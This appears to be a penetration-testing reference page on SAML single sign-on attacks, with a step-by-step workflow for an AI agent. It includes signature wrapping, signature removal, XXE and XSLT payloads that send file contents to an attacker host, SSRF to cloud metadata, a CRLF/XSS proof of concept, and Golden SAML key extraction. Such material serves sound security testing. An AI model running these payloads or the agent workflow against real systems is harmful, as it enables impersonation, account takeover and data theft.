# SAML Attacks

> **Summary**: Exploitation of SAML SSO implementations through XML manipulation, signature bypasses, and assertion forgery to authenticate as arbitrary users.
> **Impact**: Authentication bypass, account takeover, privilege escalation, arbitrary user impersonation.
> **Typical Severity**: Critical

## SAML Authentication Flow Overview

**Security Assertion Markup Language (SAML)** is an XML-based SSO protocol where an Identity Provider (IdP) issues signed assertions to a Service Provider (SP).

### Flow Steps

1. User attempts to access a protected resource on the SP
2. SP generates a SAML AuthnRequest and redirects the user to the IdP
3. User authenticates at the IdP
4. IdP creates a SAML Response containing signed Assertions (identity, attributes, conditions)
5. User's browser POSTs the base64-encoded SAML Response to the SP's Assertion Consumer Service (ACS) URL
6. SP validates the signature, conditions, and audience, then grants access

### Key SAML Components

| Component | Description |
|---|---|
| **AuthnRequest** | SP-to-IdP request; contains `AssertionConsumerServiceURL`, `Destination`, `Issuer` |
| **SAML Response** | IdP-to-SP response; contains one or more `Assertion` elements |
| **Assertion** | Contains `Subject` (NameID), `Conditions`, `AuthnStatement`, `AttributeStatement` |
| **ds:Signature** | XML Signature over the Response and/or Assertion |
| **NameID** | User identifier (email, username, or opaque ID) |
| **ACS URL** | SP endpoint that receives and validates the SAML Response |
| **RelayState** | Maintains original requested URL across the SSO redirect |

---

## Detection

### Indicators
- SAML endpoints that accept responses without valid signatures
- Applications that process SAML responses with self-signed certificates
- NameID values reflected without sanitization
- SAML endpoints that parse external XML entities

### Automated Detection
- **SAML Raider** (Burp Extension): automated XSW attack generation, signature removal, certificate faking
- **SAMLExtractor**: discover SAML endpoints across subdomains
- Nuclei templates for SAML misconfigurations

### Manual Detection
1. Intercept SAML Response in Burp (decode base64 + inflate if deflated)
2. Inspect whether both Response and Assertion are signed
3. Attempt signature removal and observe if the SP still accepts the response
4. Check if self-signed certificates are accepted
5. Test for XXE by injecting external entity declarations into the XML

---

## Exploitation

### Prerequisites
- Target application uses SAML-based SSO
- Ability to intercept and modify SAML Responses (Burp Suite with SAML Raider)
- For some attacks: a valid account on any SP that shares the same IdP

### Step-by-Step Attacks

#### 1. XML Signature Exclusion (Signature Removal)
1. Intercept the SAML Response in Burp
2. Decode and remove all `<ds:Signature>` elements
3. Modify the `NameID` to the target user (e.g., `admin@example.com`)
4. Re-encode and forward the response
5. **Success**: SP accepts unsigned response and authenticates as the target user

#### 2. XML Signature Wrapping (XSW) Attacks
The attacker injects a forged assertion while preserving the signed original, exploiting the gap between signature verification (which validates the original) and application logic (which processes the forged one).

**XSW Variants:**

| Variant | Strategy |
|---|---|
| **XSW #1** | New root element wraps the signature; evil Response added as sibling |
| **XSW #2** | Detached signature variant of XSW #1 |
| **XSW #3** | Evil Assertion inserted at same level as original Assertion |
| **XSW #4** | Original Assertion becomes child of the evil Assertion |
| **XSW #5** | Copied Assertion envelopes the Signature element |
| **XSW #6** | Copied Assertion envelopes Signature, which envelopes original -- nested deception |
| **XSW #7** | Evil Assertion inserted as child of an Extensions element (bypasses schema validation) |
| **XSW #8** | Original Assertion becomes child of a less restrictive element (reverse of XSW #7) |

**Steps (generic XSW):**
1. Intercept a valid signed SAML Response
2. In SAML Raider, select the desired XSW variant
3. The tool duplicates the Assertion, placing the forged one where the app logic reads it
4. Modify the NameID in the forged Assertion to the target user
5. Forward the modified response
6. **Success**: SP validates the original signature but processes the forged assertion

#### 3. Comment Injection in NameID
1. Intercept the SAML Response
2. Modify the NameID to inject an XML comment:
   ```xml
   <NameID>admin@example.com<!---->.evil.com</NameID>
   ```
3. Some XML parsers strip comments, resulting in `admin@example.com.evil.com` for validation but `admin@example.com` for the application
4. **Success**: authentication as `admin@example.com`

**Alternative payloads:**
```xml
<NameID>user@evil.com<!---->@example.com</NameID>
<NameID>admin<!-- comment -->@example.com</NameID>
```

#### 4. SAML Assertion Replay
1. Capture a valid SAML Response during legitimate authentication
2. Replay the same response to the SP's ACS URL after the session expires
3. If the SP does not enforce `NotOnOrAfter` conditions or track used assertion IDs, it will be accepted
4. **Success**: session re-established from replayed assertion

#### 5. Certificate Faking (Self-Signed)
1. Intercept the SAML Response in Burp
2. Send the certificate to SAML Raider Certs tab
3. Click "Save and Self-Sign" to create a self-signed clone
4. Remove existing signatures from the response
5. Re-sign the response/assertion with the self-signed certificate
6. Forward the modified response
7. **Success**: SP accepts the self-signed certificate without validating the trust chain

#### 6. Recipient/Destination Manipulation (Token Recipient Confusion)
1. Authenticate legitimately with SP-Legit (which shares an IdP with SP-Target)
2. Intercept the SAML Response intended for SP-Legit
3. Redirect/replay that response to SP-Target's ACS URL
4. If SP-Target does not validate the `Recipient` field in `SubjectConfirmationData`, it accepts the assertion
5. **Success**: access SP-Target using credentials intended for SP-Legit

#### 7. XXE via SAML
1. Intercept the SAML Response
2. Inject an XML external entity declaration before the root element:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <samlp:Response ...>
     <saml:Issuer>&xxe;</saml:Issuer>
     ...
   ```
3. Forward the modified response
4. **Success**: server processes the external entity, leaking file contents or triggering SSRF

#### 8. XSLT Injection via SAML
1. Inject an XSLT stylesheet inside the `<ds:Transforms>` element of the signature:
   ```xml
   <ds:Transform>
     <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
       <xsl:template match="doc">
         <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
         <xsl:variable name="escaped" select="encode-for-uri($file)"/>
         <xsl:value-of select="unparsed-text(concat('http://<ATTACKER_HOST>/',$escaped))"/>
       </xsl:template>
     </xsl:stylesheet>
   </ds:Transform>
   ```
2. XSLT transformations execute before signature verification
3. **Success**: file read or SSRF via XSLT processing, even with an invalid signature

#### 9. Golden SAML Attack
1. Extract the IdP's token-signing private key and certificate (from ADFS server, Azure AD Connect, etc.)
2. Use the key to forge arbitrary SAML assertions for any user, with any attributes and roles
3. Submit the forged assertion to any SP that trusts the IdP
4. **Success**: persistent, undetectable impersonation of any user; no authentication logs at the IdP since the assertion is forged offline

### Payloads

#### NameID Manipulation
```xml
<!-- Target user -->
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@example.com</NameID>

<!-- Comment injection -->
<NameID>admin@example.com<!--COMMENT-->.attacker.com</NameID>

<!-- Null byte (some parsers) -->
<NameID>admin@example.com%00@attacker.com</NameID>
```

#### XXE Payloads for SAML
```xml
<!-- File read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- OOB exfiltration -->
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://<ATTACKER_HOST>/evil.dtd">%dtd;]>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

### Proof of Concept

**RelayState-based reflected XSS (header injection):**
```http
POST /cgi/logout HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<BASE64_VALID_RESPONSE>&RelayState=DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==
```

The base64-decoded RelayState injects `Content-Type: text/html` and an SVG XSS payload via CRLF injection.

---

## Bypasses

- **Signature not required**: remove all `<ds:Signature>` elements; if SP does not enforce signing, the response is accepted
- **Only Response signed, not Assertion**: modify the Assertion (NameID, attributes) without breaking the Response-level signature
- **Only Assertion signed, not Response**: modify Response metadata while keeping the signed Assertion intact
- **XML round-trip attacks**: exploit XML parser inconsistencies where serialization/deserialization changes element order (e.g., REXML in Ruby)
- **Schema-less elements**: insert forged assertions under `<Extensions>` or other elements with relaxed schemas
- **Encoding tricks**: double base64 encoding, deflate/inflate manipulation to bypass WAFs

---

## Escalation

- **Horizontal privilege escalation**: change NameID to impersonate other users at the same privilege level
- **Vertical privilege escalation**: modify attribute statements (e.g., `role=admin`) in forged assertions
- **Golden SAML persistence**: once the IdP signing key is obtained, forge assertions indefinitely without detection
- **Cross-SP lateral movement**: Token Recipient Confusion to move between service providers sharing the same IdP
- **Chain with XXE/SSRF**: use XXE via SAML to read internal files, access cloud metadata, or pivot to internal services

---

## Tools

| Tool | Usage |
|---|---|
| [SAML Raider (Burp)](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) | XSW attacks, signature removal, certificate faking, XXE PoC generation |
| [SAMLExtractor](https://github.com/fadyosman/SAMLExtractor) | Discover SAML consumer URLs across subdomains |
| [saml2aws](https://github.com/Versent/saml2aws) | CLI for SAML-based AWS credential retrieval |
| [shimit](https://github.com/cyberark/shimit) | Golden SAML attack tool |
| [ADFSDump](https://github.com/mandiant/ADFSDump) | Extract ADFS token-signing certificates for Golden SAML |
| Burp Suite Decoder | Base64 decode/encode and inflate/deflate SAML messages |
| xmllint / xmlstarlet | Offline XML parsing and manipulation of SAML responses |

---

## Related

- [XXE](../vulns/xxe.md) -- XXE attacks embedded in SAML XML
- [JWT Attacks](jwt.md) -- alternative token format; some IdPs issue JWTs alongside SAML
- [OAuth Attacks](oauth.md) -- related SSO protocol with different attack surface
- [CSRF](../vulns/csrf.md) -- CSRF delivery of forged SAML responses
- [CRLF Injection](../vulns/crlf.md) -- RelayState CRLF injection for reflected XSS

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for SAML vulnerabilities.

### Phase 1: Discovery
1. Identify SAML SSO endpoints by inspecting HTTP traffic for:
   - `SAMLRequest` and `SAMLResponse` parameters in POST bodies or query strings
   - Redirects to IdP login pages with SAML AuthnRequest
   - ACS (Assertion Consumer Service) URLs in form actions
2. Capture a complete SAML Response by authenticating through the SSO flow:
   - Intercept the POST to the ACS URL containing the base64-encoded `SAMLResponse`
3. Decode the SAML Response: base64 decode (and inflate if deflated) to obtain the raw XML
4. Map the SAML structure: identify `<samlp:Response>`, `<saml:Assertion>`, `<ds:Signature>`, `<saml:NameID>`, `<saml:Conditions>`, `<saml:AttributeStatement>`
5. Run SAMLExtractor to discover SAML consumer URLs across subdomains:
   ```
   python3 SAMLExtractor.py -u <TARGET_DOMAIN>
   ```

### Phase 2: Validation
1. Check if the SAML Response is signed (`<ds:Signature>` present in `<samlp:Response>`)
2. Check if the SAML Assertion is signed (`<ds:Signature>` present in `<saml:Assertion>`)
3. Test signature exclusion: remove all `<ds:Signature>` elements, re-encode, and submit
   - If accepted: signature verification is not enforced (CRITICAL)
4. Check if only the Response is signed (Assertion can be modified without breaking signature)
5. Check if only the Assertion is signed (Response metadata can be modified)
6. Test if self-signed certificates are accepted:
   - In SAML Raider, send the certificate to Certs tab, click "Save and Self-Sign"
   - Re-sign the response with the self-signed cert and submit

### Phase 3: Exploitation
1. **Signature exclusion**: Remove `<ds:Signature>` elements, change `<NameID>` to `<TARGET_ADMIN_EMAIL>`, re-encode, and forward
2. **XML Signature Wrapping (XSW)**: Use SAML Raider to test all 8 XSW variants (XSW #1 through XSW #8):
   - For each variant: duplicate the Assertion, place the forged copy where the app reads it, modify `<NameID>` to `<TARGET_USER>` in the forged Assertion
   ```
   In SAML Raider: select XSW variant → modify NameID in forged assertion → forward
   ```
3. **Comment injection in NameID**: Insert XML comments to confuse the parser:
   ```xml
   <NameID><TARGET_USER><!--COMMENT-->.<ATTACKER_DOMAIN></NameID>
   ```
   The XML parser may strip comments, resulting in the app seeing only `<TARGET_USER>`
4. **Certificate faking**: Generate a self-signed certificate that clones the original, re-sign the modified response/assertion with it, and submit
5. **XXE via SAML**: Inject an external entity declaration before the root element:
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   ```
   Reference `&xxe;` in `<saml:Issuer>` or `<saml:NameID>`
6. **XSLT injection**: Inject an XSLT stylesheet inside `<ds:Transforms>` to read files or trigger SSRF before signature verification

### Phase 4: Escalation
1. **Golden SAML**: If the IdP token-signing private key is accessible (ADFS server, Azure AD Connect), extract it using ADFSDump and forge arbitrary assertions offline with shimit
2. **Arbitrary user impersonation**: Use the discovered bypass to authenticate as any user by changing the NameID to their email/username
3. **Cross-SP lateral movement**: Replay a SAML Response from `<SP_A>` to `<SP_B>`'s ACS URL if Recipient/Audience is not validated
4. **XXE to internal file read or SSRF**: Use XXE via SAML to access `file:///etc/passwd`, cloud metadata (`http://169.254.169.254/`), or internal services
5. **Privilege escalation via AttributeStatement**: Modify role/group attributes in the forged assertion (e.g., `<Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>`)

## Decision Tree

```
SAML Response Captured
├── Remove all <ds:Signature> elements
│   └── Accepted? → No signature verification (CRITICAL -- forge any assertion)
├── Only Response signed?
│   └── Modify Assertion NameID/attributes without breaking Response signature
├── Only Assertion signed?
│   └── Modify Response metadata, inject additional unsigned assertions
├── Both signed? → Try XSW attacks (XSW #1 through #8)
│   ├── XSW #1: New root wraps signature, evil Response as sibling
│   ├── XSW #2: Detached signature variant
│   ├── XSW #3: Evil Assertion at same level
│   ├── XSW #4: Original Assertion becomes child of evil
│   ├── XSW #5: Copied Assertion envelopes Signature
│   ├── XSW #6: Nested envelope deception
│   ├── XSW #7: Evil Assertion in Extensions element
│   └── XSW #8: Original in less restrictive element
├── Comment injection in NameID
│   └── Parser strips comments? → Authenticate as target user
├── Self-signed certificate accepted?
│   └── YES → Sign any forged assertion with attacker cert
├── XXE in SAML XML?
│   └── External entities parsed? → File read, SSRF, OOB exfiltration
└── IdP signing key accessible?
    └── YES → Golden SAML (persistent, undetectable impersonation)
```

## Success Criteria
- [ ] Authenticated as an arbitrary user (e.g., `admin@<TARGET_DOMAIN>`) without valid IdP credentials
- [ ] Forged SAML Assertion accepted by the SP with modified NameID
- [ ] XSW attack variant bypassed signature verification while app processed forged assertion
- [ ] Self-signed certificate accepted by the SP without trust chain validation
- [ ] XXE or XSLT injection executed via SAML XML processing

## References

- [HackTricks - SAML Attacks](https://book.hacktricks.xyz/pentesting-web/saml-attacks)
- [How to Test SAML - A Methodology (Part 1)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [How to Test SAML - A Methodology (Part 2)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
- [How to Test SAML - A Methodology (Part 3)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
- [XSS Affecting 20+ Uber Subdomains via SAML](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)
- [Out-of-Band XXE via SAML (PDF)](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
- [On Breaking SAML (USENIX Security 2012)](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)
- [CyberArk - Golden SAML Attack](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)
- [Securing XML Implementations Across the Web (Mattermost)](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
